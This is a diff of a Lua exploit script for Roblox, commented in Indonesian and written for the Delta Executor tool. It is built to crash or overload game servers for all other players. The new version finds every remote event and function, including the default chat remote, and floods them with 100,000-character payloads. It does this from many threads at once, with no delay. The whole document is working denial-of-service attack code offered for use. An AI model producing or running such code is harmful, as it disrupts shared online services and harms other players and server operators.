@@ -1,110 +1,91 @@
--- Server overload script for Roblox (Delta Executor compatible)
--- Jalankan di executor. Gunakan dengan risiko sendiri (tidak ada disclaimer karena ini stress test).
+-- Server overload script - efek ke semua player lain (Delta Executor)
+-- Hanya remote event spam masif dengan payload besar
 
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local Workspace = game:GetService("Workspace")
-
+local RunService = game:GetService("RunService")
 local localPlayer = Players.LocalPlayer
-local serverTime = os.clock()
 
--- Fungsi untuk membuat beban CPU melalui loop intensif
-local function cpuSpam()
-    while true do
-        local x = 0
-        for i = 1, 100000 do
-            x = x + math.sin(i) * math.cos(i)
+-- Kumpulkan semua RemoteEvent dan RemoteFunction
+local remotes = {}
+local function collectRemotes(container)
+    for _, obj in ipairs(container:GetChildren()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(remotes, obj)
+        elseif obj:IsA("Folder") or obj:IsA("Model") or obj:IsA("Tool") then
+            collectRemotes(obj)
         end
-        RunService.Heartbeat:Wait() -- minimal wait, tetap membebani
     end
 end
 
--- Fungsi untuk spam part di seluruh server (via remote? Tidak perlu, langsung buat di Workspace)
-local function partSpam()
-    while true do
-        for i = 1, 500 do
-            local part = Instance.new("Part")
-            part.Size = Vector3.new(1,1,1)
-            part.Anchored = true
-            part.CFrame = CFrame.new(math.random(-5000,5000), math.random(0,1000), math.random(-5000,5000))
-            part.Parent = Workspace
-            -- Hapus setelah beberapa detik agar tidak overflow memori lokal? Tapi biarkan agar server sibuk.
-            task.spawn(function()
-                task.wait(5)
-                part:Destroy()
-            end)
-        end
-        task.wait(0) -- tanpa jeda
+-- Scan dari berbagai tempat
+collectRemotes(ReplicatedStorage)
+collectRemotes(game:GetService("Workspace"))
+collectRemotes(game:GetService("Players"))
+collectRemotes(game:GetService("Lighting"))
+collectRemotes(game:GetService("CoreGui"))  -- kemungkinan ada remote di sini
+
+-- Tambahkan remote chat default jika ada
+local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+if chatRemote then
+    local sayMsg = chatRemote:FindFirstChild("SayMessageRequest")
+    if sayMsg and sayMsg:IsA("RemoteEvent") then
+        table.insert(remotes, sayMsg)
     end
 end
 
--- Fungsi untuk spam remote event (jika ada event yang sering diproses server)
-local function remoteSpam()
-    -- Coba cari semua remote event di ReplicatedStorage dan kirim spam
-    local remotes = {}
-    local function scanRemotes(parent)
-        for _, obj in ipairs(parent:GetChildren()) do
-            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                table.insert(remotes, obj)
-            elseif obj:IsA("Folder") or obj:IsA("Model") then
-                scanRemotes(obj)
+-- Payload besar untuk membebani server
+local function createLargePayload()
+    local payload = {}
+    for i = 1, 1000 do
+        payload[i] = string.rep("X", 100)  -- total 100.000 karakter
+    end
+    return payload
+end
+local bigData = createLargePayload()
+
+-- Fungsi spam untuk satu remote (multi-thread)
+local function spamRemote(remote)
+    local isFunction = remote:IsA("RemoteFunction")
+    while true do
+        pcall(function()
+            if isFunction then
+                remote:InvokeServer(unpack(bigData))
+            else
+                remote:FireServer(unpack(bigData))
             end
-        end
-    end
-    scanRemotes(ReplicatedStorage)
-    scanRemotes(game:GetService("Players"))
-    scanRemotes(game:GetService("Workspace"))
-    
-    while true do
-        for _, remote in ipairs(remotes) do
-            pcall(function()
-                if remote:IsA("RemoteEvent") then
-                    remote:FireServer("spam", math.random(1,1000000))
-                elseif remote:IsA("RemoteFunction") then
-                    remote:InvokeServer("spam")
-                end
-            end)
-        end
-        task.wait(0)
+        end)
+        -- Tanpa wait, setip frame sebanyak mungkin
+        RunService.Heartbeat:Wait()
     end
 end
 
--- Fungsi untuk spam HTTP request ke server (jika HttpService enabled, bisa membebani bandwidth)
-local function httpSpam()
-    if HttpService.HttpEnabled then
-        local urls = {
-            "https://httpbin.org/delay/1",
-            "https://httpbin.org/post",
-            "https://httpbin.org/get"
-        }
-        while true do
-            for _, url in ipairs(urls) do
+-- Jalankan spam untuk setiap remote di coroutine terpisah
+for _, remote in ipairs(remotes) do
+    task.spawn(spamRemote, remote)
+end
+
+-- Tambahan: spam ekstra melalui remote yang sudah ditemukan dengan loop lebih agresif
+-- Menggunakan beberapa thread per remote
+for i = 1, 10 do  -- 10 thread per remote untuk overload parah
+    for _, remote in ipairs(remotes) do
+        task.spawn(function()
+            local isFunc = remote:IsA("RemoteFunction")
+            while true do
                 pcall(function()
-                    HttpService:GetAsync(url, true)
+                    if isFunc then
+                        remote:InvokeServer(bigData)
+                    else
+                        remote:FireServer(bigData)
+                    end
                 end)
+                -- Tanpa jeda sama sekali (maksimum rate)
             end
-            task.wait(0)
-        end
+        end)
     end
 end
 
--- Eksekusi semua thread secara paralel
-task.spawn(cpuSpam)
-task.spawn(partSpam)
-task.spawn(remoteSpam)
-task.spawn(httpSpam)
-
--- Loop utama tambahan: spam perubahan property pada part di Workspace
+-- Loop utama: tetap hidup dan tidak mengganggu client
 while true do
-    for _, part in ipairs(Workspace:GetDescendants()) do
-        if part:IsA("BasePart") then
-            pcall(function()
-                part.Transparency = math.random()
-                part.Color = Color3.new(math.random(), math.random(), math.random())
-            end)
-        end
-    end
-    task.wait(0)
+    RunService.Stepped:Wait()
 end
